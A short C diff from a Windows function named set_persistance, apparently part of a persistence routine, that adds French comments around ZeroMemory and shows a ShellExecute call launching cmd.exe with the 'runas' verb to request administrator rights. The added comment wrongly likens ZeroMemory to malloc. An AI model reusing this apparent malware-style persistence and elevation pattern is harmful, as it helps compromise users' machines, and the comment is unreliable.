@@ -17,7 +17,11 @@ void set_persistance(char *softwareDataDirectory, char *current_executable_path,
     */
 
     SHELLEXECUTEINFO sei;
-    ZeroMemory(&sei, sizeof(sei));
+
+    /* ZeroMemory: un peut comme malloc sauf que ça initalise la mémoire avec des 0 ( fonction de windows.h évite les erreur)
+    avec cette fonction pas besoin de libérer la mémoire avec free !*/
+    ZeroMemory(&sei, sizeof(sei)); 
+
     sei.cbSize = sizeof(sei);
     sei.lpVerb = "runas";  // pour demander les perms admin 
     sei.lpFile = "cmd.exe"; 
